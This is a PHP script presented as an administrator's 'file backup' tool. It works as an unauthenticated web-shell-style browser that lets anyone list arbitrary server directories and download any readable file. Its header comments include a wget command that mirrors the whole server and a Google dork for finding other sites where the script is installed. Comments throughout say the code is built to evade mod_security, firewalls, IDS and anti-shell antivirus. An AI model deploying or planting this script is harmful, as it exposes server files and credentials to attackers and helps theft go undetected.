<?php
/* w.filebackup.php V1.0 for Administrators by WHK
 *
 * Email: yan.uniko.102@gmail.com
 * Website: http://whk.drawcoders.net/
 * 
 * Uso Bash:
 * --------
 * 		mkdir page && cd page
 * 		wget -r -x -nH -np --cut-dirs=1 --no-check-certificate --post-data 'token=1' -e robots=off -U 'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02011-10-16' http://example.com/w.filebackup.php
 * 		rm -rf w.filebackup.php*
 * 
 * Uso WEB:
 * --------
 *		http://web.page/w.filebackup.php
 * 
 * Al enviar la variable "token" via HTTP/POST restringe la visualizaci�n
 * de los directorios hasta la ruta actual del script, esto evita que el
 * respaldo salga fuera del directorio planeado y cause una sobrecarga.
 * Solo utilizar sin esta variable en caso de querer hacer una backup
 * extrema con mucho tiempo libre.
 * 
 * GoogleDork:
 * ----------
 * inurl:".php?do=/" + intitle:"index of"
 * 
 * Legal:
 * -----
 * Uso esclusivo sobre servidores propios, nunca utilizar en servidores sin el consentimiento del administrador.
 * El usuario es totalmente responsable de su utilizaci�n.
 * En caso de no aceptar este acuerdo no debe ser utilizado.
 * 
 * Compatible:
 * ----------
 * Este Script es compatible con servidores con safe mode en ON, servidores sin
 * zlib, sin gz, servidores que no tienen acceso a la shell del sistema, servdiores
 * con mod evasive y mod security, servdiores con firewalls y Antivirus antiShells.
 * No se asegura su funcionalidad al 100% debido a posibles reglas de protecci�n que
 * impidan su normal funcionamiento.
 */

if($getPath = substr($_SERVER['PHP_SELF'], strlen($_SERVER['SCRIPT_NAME']))){
	
	/* Procesa el archivo */
	if(is_file($getPath)){
			
		/* Obtiene el tipo MIME */
		if(function_exists('mime_content_type')) {
			$mime = mime_content_type($getPath);
		}elseif(function_exists('finfo_file')){
			$info = finfo_open(FILEINFO_MIME);
			$mime = finfo_file($info, $getPath);
			finfo_close($info);
		}
		if(!$type)
			$mime = 'application/force-download';

		/* Establece las cabeceras */
		header('Content-Type: '.$mime);
		header('Content-Disposition: attachment; filename='.basename($getPath));
		header('Content-Transfer-Encoding: binary');
		header('Content-Length: '.filesize($getPath));

		/* Hacia el infinito y mas all�! */
		if(!@ini_get('safe_mode'))
			@set_time_limit(0);

		/* readfile($getPath); que sucede cuando el archivo es mas grande que 
		 * la capacidad de memoria ram asignada en php.ini como un iso, un gz
		 * con una backup de cpanel o un video? */
		if($handle = fopen($getPath, 'r')){
			
			/* utiliza bloques de 4kb en modo binario para no corromper el
			 * contenido a descargar y evitar el uso desmedido de la memoria ram
			 * y evitar el activado de alarmas de IDS y Firewalls */
			while(($buffer = fgets($handle, 4096)) !== false)
				echo $buffer;
			fclose($handle);
		}

		exit;

	/* Procesa el directorio */
	}elseif(is_dir($getPath)){
		$absolutePath = $getPath;

	/* Si no es archivo ni directorio que es? */
	}else /* 404 */
		$err = 'File not found or access denied ( '.$getPath.' ).';
}

/* Utiliza variables que no sean tan f�ciles de incluir en un
 * mod security o alguna regla del firewall (do es utilizado
 * por vbulletin). */
if(isset($_GET['do']) and (is_dir($_GET['do'])))
	$absolutePath = $_GET['do'];


if((!isset($absolutePath)) or (!$absolutePath))
	$absolutePath = dirname(__file__).'/';

/* Restringe la URL si se solicita */
if(isset($_POST['token']) and (strlen($absolutePath) < strlen(dirname(__file__).'/')))
	$absolutePath = dirname(__file__).'/';

$items = array(
	'glob'		=> array(),
	'folders'	=> array(),
	'files'		=> array()
);

// if($items['glob'] = glob($absolutePath.'*')){ glob() no encuentra los archivos ocultos como .htaccess
if($items['glob'] = scandir($absolutePath)){
	foreach($items['glob'] as $item){
		if(!in_array($item, array('.','..'))){
			if(is_dir($absolutePath.$item))
				$items['folders'][] = $absolutePath.$item.'/';
			else
				$items['files'][] = $absolutePath.$item;
		}
		unset($item);
	}
}

unset($items['glob']);

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
	<head>
		<title>Index of <?php echo htmlspecialchars($absolutePath, ENT_QUOTES); ?></title>
	</head>
	<body>
		<h1>Index of <?php echo htmlspecialchars($absolutePath, ENT_QUOTES); ?></h1>
		<?php if(isset($err)){ ?>
			<p><b><i><?php echo htmlspecialchars($err, ENT_QUOTES); ?></i></b></p>
		<?php } ?>
		
		<ul>
			<?php if(!isset($_POST['token'])){ ?>
				<li>
					<a href="<?php echo $_SERVER['SCRIPT_NAME'].dirname(substr($absolutePath, 0, -1)); ?>/"> Parent Directory</a>
				</li>
			<?php } ?>
	
			<?php if($items['files']){ ?>
				<?php foreach($items['files'] as $file){ ?>
					<li>
						<a href="<?php echo $_SERVER['SCRIPT_NAME'].$file; ?>"> <?php echo htmlspecialchars(basename($file), ENT_QUOTES); ?></a>
					</li>
				<?php } ?>
			<?php } ?>
	
			<?php if($items['folders']){ ?>
				<?php foreach($items['folders'] as $folder){ ?>
					<li>
						<a href="<?php echo $_SERVER['SCRIPT_NAME'].'?do='.urlencode($folder); ?>"><?php echo htmlspecialchars(basename($folder), ENT_QUOTES); ?>/</a>
					</li>
				<?php } ?>
			<?php } ?>
	
		</ul>
		
		<address>
					<?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE'], ENT_QUOTES); ?> Server
			at		<?php echo htmlspecialchars($_SERVER['HTTP_HOST'], ENT_QUOTES); ?>
			Port	<?php echo (int)$_SERVER['SERVER_PORT']; ?>
		</address>
	</body>
</html>

<?php
/* Evita la ejecucion arbitraria por un LFI o <preppendfile> */
exit;

